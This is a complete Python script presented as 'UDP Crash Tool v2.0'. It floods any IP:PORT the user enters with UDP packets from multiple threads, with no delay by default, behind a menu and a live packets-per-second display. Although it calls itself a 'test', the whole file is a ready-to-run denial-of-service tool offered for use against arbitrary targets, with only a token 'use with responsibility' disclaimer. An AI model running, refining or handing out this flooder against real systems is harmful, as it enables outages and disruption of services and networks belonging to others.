import socket
import threading
import time
import sys
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, IntPrompt
from rich.panel import Panel
from rich import print
from rich.live import Live

class UDPTest:
    def __init__(self, target_ip, target_port, packet_size=1024, delay=0, threads=1):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.delay = delay
        self.thread_count = threads
        self.stop_flag = False
        self.packets_sent = 0
        self.start_time = None
        self.console = Console()

    def send_udp_packets(self, thread_id):
        message = b'\x00' * self.packet_size
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while not self.stop_flag:
            try:
                sock.sendto(message, (self.target_ip, self.target_port))
                self.packets_sent += 1
                if self.delay > 0:
                    time.sleep(self.delay / 1000)  # Convert ms to seconds
            except Exception as e:
                self.console.print(f"[red]Error in thread {thread_id}: {e}[/red]")
                break

        sock.close()

    def display_stats(self):
        while not self.stop_flag:
            elapsed_time = time.time() - self.start_time
            pps = self.packets_sent / elapsed_time if elapsed_time > 0 else 0
            
            stats_table = Table(show_header=False, border_style="blue")
            stats_table.add_row("Target", f"[cyan]{self.target_ip}:{self.target_port}[/cyan]")
            stats_table.add_row("Packets Sent", f"[green]{self.packets_sent:,}[/green]")
            stats_table.add_row("Elapsed Time", f"[yellow]{elapsed_time:.2f}s[/yellow]")
            stats_table.add_row("Packets/Second", f"[magenta]{pps:.2f}[/magenta]")
            stats_table.add_row("Active Threads", f"[blue]{self.thread_count}[/blue]")
            
            self.console.clear()
            self.console.print(Panel(stats_table, title="[bold red]UDP Test Statistics[/bold red]"))
            time.sleep(0.5)

    def start_test(self):
        self.start_time = time.time()
        threads = []
        
        #Start statistics display thread
        stats_thread = threading.Thread(target=self.display_stats)
        stats_thread.daemon = True
        stats_thread.start()

        #Start UDP sending threads
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.send_udp_packets, args=(i+1,))
            thread.daemon = True
            threads.append(thread)
            thread.start()

        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_flag = True
            self.console.print("\n[yellow]Stopping test...[/yellow]")
            for thread in threads:
                thread.join()

def show_menu():
    console = Console()
    menu_table = Table(show_header=False, border_style="green")
    menu_table.add_row("[cyan]UDP Crash Tool v2.0[/cyan]")
    menu_table.add_row("1. Start UDP Test")
    menu_table.add_row("2. Show Configuration")
    menu_table.add_row("3. Exit")
    menu_table.add_row("Credit: PRINCE-LK")
    console.print(Panel(menu_table, title="[bold green]Main Menu[/bold green]"))

def get_test_config():
    console = Console()
    config = {}
    
    console.print("\n[bold cyan]Test Configuration[/bold cyan]")
    
    target = Prompt.ask("Enter target address (IP:PORT)")
    if ':' not in target:
        console.print("[red]Invalid format. Please use IP:PORT format[/red]")
        return None
    
    ip, port = target.split(':')
    try:
        port = int(port)
    except ValueError:
        console.print("[red]Port must be a number[/red]")
        return None

    config['ip'] = ip
    config['port'] = port
    config['packet_size'] = IntPrompt.ask("Enter packet size (bytes)", default=1024)
    config['delay'] = IntPrompt.ask("Enter delay between packets (ms)", default=0)
    config['threads'] = IntPrompt.ask("Enter number of threads, for only low ping it can be like 4 to 10, but for 999+ put 100", default=1)

    return config

def show_config(config):
    if not config:
        return
    
    console = Console()
    config_table = Table(show_header=False, border_style="yellow")
    config_table.add_row("Target IP", f"[cyan]{config['ip']}[/cyan]")
    config_table.add_row("Target Port", f"[cyan]{config['port']}[/cyan]")
    config_table.add_row("Packet Size", f"[cyan]{config['packet_size']} bytes[/cyan]")
    config_table.add_row("Delay", f"[cyan]{config['delay']} ms[/cyan]")
    config_table.add_row("Threads", f"[cyan]{config['threads']}[/cyan]")
    
    console.print(Panel(config_table, title="[bold yellow]Current Configuration[/bold yellow]"))

def main():
    console = Console()
    config = None

    while True:
        show_menu()
        choice = Prompt.ask("Select an option", choices=["1", "2", "3"])

        if choice == "1":
            if not config:
                config = get_test_config()
                if not config:
                    continue

            test = UDPTest(
                config['ip'],
                config['port'],
                config['packet_size'],
                config['delay'],
                config['threads']
            )
            
            console.print("\n[bold green]Starting UDP test...[/bold green]")
            console.print("[yellow]Press Ctrl+C to stop the test[/yellow]\n")
            
            test.start_test()

        elif choice == "2":
            if config:
                show_config(config)
            else:
                console.print("[yellow]No configuration set. Please start a test first.[/yellow]")

        elif choice == "3":
            console.print("[bold red]Exiting...[/bold red]")
            break

        console.print("\nPress Enter to continue...")
        input()

if __name__ == "__main__":
    main()
    
# Made BY NS-TEAM, use with responsibility, and at your owm risk.
